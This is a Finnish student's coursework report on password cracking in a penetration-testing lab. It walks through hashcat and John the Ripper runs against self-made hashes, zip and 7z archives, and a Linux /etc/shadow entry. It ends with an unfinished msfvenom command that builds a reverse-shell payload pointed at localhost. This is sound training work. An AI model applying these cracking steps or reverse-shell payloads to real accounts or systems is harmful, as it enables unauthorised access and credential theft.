### h5 Syyskuu2025!


## x) Lue/katso ja tiivistä. (Tässä x-alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen tai kuunteleminen ja tiivistelmä riittää. Tiivistämiseen riittää muutama ranskalainen viiva kustakin artikkelista. Kannattaa lisätä myös jokin oma ajatus, idea, huomio tai kysymys.)
- Hashcat artikkelissa käydään läpi hashcatin perusteet sekä maailman yleisimmän sanalistan `rockyou`n lataaminen.
- Hashid komennolla voidaan selvittää tiivisteen tyyppi, yleisimpiä MD5 sekä SHA256.
- John the ripper artikkelissa käydään läpi kuinka sovellus asennetaan, ja artikkelista löytyy harjoitustiedosto, jonka voi murtaa. 
- Ihmiset ovat laiskoja ja käyttävät samoja huonoja salasanoja useissa paikoissa.
- Tietokoneet ovat nykyään tehokkaampia ja näin ollen tiivisteitten murtaminen on nykyään nopeampaa ja tehokkaampaa.




## Harjoitustehtävät

# a) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana.

Käyttämässäni Kali virtuaalikoneessa on hashcat jo valmiiksi asennettuna, joten siirryn suoraan murtamaan jotakin esimerkkisalasanaa.

Latasin ensiksi rockyou sanakirjan
>$ wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
>
>$ tar xf rockyou.txt.tar.gz
>
>$ rm rockyou.txt.tar.gz

ja sen jälkeen valitsin sieltä sattumanvaraisen salasanan, joka on `bluecow`.
Generoin bluecowista tiivisteen komennolla `echo -n bluecow |sha256sum` 

<img width="668" height="270" alt="hashcat1" src="https://github.com/user-attachments/assets/5b0a43cc-6538-486d-a6b6-1ff1ebfeb4ed" />


Tämän jälkeen murretaan tiiviste komennolla `hashcat -m 1400 23e9b47784b6debd4613170e4802894a3c871858124efe11a395fd6a68eef73b rockyou.txt -o solved`.
Hashcat onnistui murtamaan salasanan ja tallensi vastauksen solved nimiseen tiedostoon.

<img width="638" height="106" alt="solved" src="https://github.com/user-attachments/assets/b8ed1c6f-b00e-4572-91d0-44986876f7e3" />

# c) Asenna John the Ripper ja testaa sen toiminta murtamalla jonkin esimerkkitiedoston salasana.

John the Ripper oli myös valmiiksi asennettuna Kalissa, ja tiedosto jota lähden murtamaan löytyy Tero Karvisen Crack File Password With John artikkelista.

<img width="485" height="114" alt="terozip" src="https://github.com/user-attachments/assets/0ad12da2-a3e1-4325-bb41-6e3be4271b94" />

Paketin purkamisen jälkeen puretaan vielä tiiviste uuteen tiedostoon komennolla `zip2john tero.zip > tero.zip.hash`.
Sitten suoritetaan sanakirjahyökkäys tiivisteeseen komennolla `john tero.zip.hash`.
Tulosteesta löytyy tiedoston salasana, jolla pakattu tiedosto saadaan avattua.

<img width="812" height="218" alt="terozip2" src="https://github.com/user-attachments/assets/0c8fe932-7636-42a3-a56c-3deb5577e1a9" />

<img width="632" height="171" alt="terozip3" src="https://github.com/user-attachments/assets/fced4b14-46a9-4583-a87d-6ff21e9b487a" />


# e) Tiedosto. Tee itse tai etsi verkosta jokin salakirjoitettu tiedosto, jonka saat auki. Murra sen salaus. (Jokin muu formaatti kuin aiemmissa alakohdissa kokeilemasi).


 Aloitetaan luomalla tiedosto `echo "Harjoitus tiedosto" > Harjoitus.txt` ja sitten lisätään tiedosto salasanalla suojattuun pakettiin 7-zipillä `7z a -p salattu.7z Harjoitus.txt` komennossa optio a tarkoittaa että lisätään tiedosto ja -p:llä asetetaan salasana.
 
Seuraavaksi muutetaan paketti tekstitiedostoksi `7z2john salattu.7z > salattu.7z.hash` ja sitte murretaan tekstitiedosto 
`john --wordlist=rockyou.txt salattu.7z.hash`. 
<img width="771" height="239" alt="john1" src="https://github.com/user-attachments/assets/3e542532-5b3b-404d-8216-fbac7bfef6b7" />

Ja sitten puretaan vielä salattu tiedosto `7z x salattu.7z`

# f) Tiiviste. Tee itse tai etsi verkosta salasanan tiiviste, jonka saat auki. Murra sen salaus. (Jokin muu formaatti kuin aiemmissa alakohdissa kokeilemasi. Voit esim. tehdä käyttäjän Linuxiin ja murtaa sen salasanan.)

Aloitin tehtävän luomalla uuden käyttäjän `sudo useradd huser` ja lisäämällä salasanan `sudo passwd huser`.  
Sitten tallennetaan huser käyttäjän /etc/shadow ja /etc/passwd rivit.
> sudo grep '^huser:' /etc/passwd > huser.passwd
>
> sudo grep '^huser:' /etc/shadow > huser.shadow

Sitten nämmä kaksi riviä yhdistetään käyttäen unshadow työkalua. 
`sudo unshadow huser.passwd huser.shadow > huser_unshadow.txt` 
Tämän jälkeen aloitin murtamisen `john --wordlist=rockyou.txt huser_unshadow.txt`, mutta tällä komennolla ei löytynyt yhtään tiivisteitä. 
Tässä vaiheessa en keksinyt missä vika on, joten kysyin ChatGPT:ltä mikä voisi olla vikana, ja se ehdotti tiivisteen alun tarkastamista joka paljasti että tiivisteen, jonka pitäisi alkaa `$6$` alkaakin `$y$` tämä tarkoitti sitä, että tiiviste yescrypt muodossa, ja sen avaamista varten komentoon tulee lisätä `--format=crypt`  
Ajoin uuden komennon, ja annoin sen hetken rullata kunnes keskeytin sen, ja huomasin että pyynnön suorittamisessa kestäisi arviolta kaksi vuorokautta. 

<img width="945" height="191" alt="john2" src="https://github.com/user-attachments/assets/73ada31e-fcef-44ce-9bf8-0bb26e3ffa1f" />

En sitten ajanut tätä uudestaa, vaan loin uuden sanalistan jossa oli pelkästään oikea salasana, ja ajoin sitä käyttäen saman, ja se toimi. 

<img width="944" height="262" alt="john3" src="https://github.com/user-attachments/assets/6c299a4b-50cf-442e-adfb-fc248b105ec4" />

# g) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.

*Tekemättä*

`msfvenom -l payloads` komennolla löysin `linux/x64/shell/reverse_tcp` payloadin, ja kokeilin luoda haittaohjelman `msfvenom -p linux/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > infected.elf`. Tätä enempää en saanut ratkottua tehtävää. 



## Lähteet

https://terokarvinen.com/tunkeutumistestaus/

https://learning.oreilly.com/videos/security-penetration-testing/9780134833989/9780134833989-sptt_00_06_00_00 

https://terokarvinen.com/2022/cracking-passwords-with-hashcat/

https://terokarvinen.com/2023/crack-file-password-with-john/

https://www.youtube.com/watch?v=ZqWfDrD2WVY

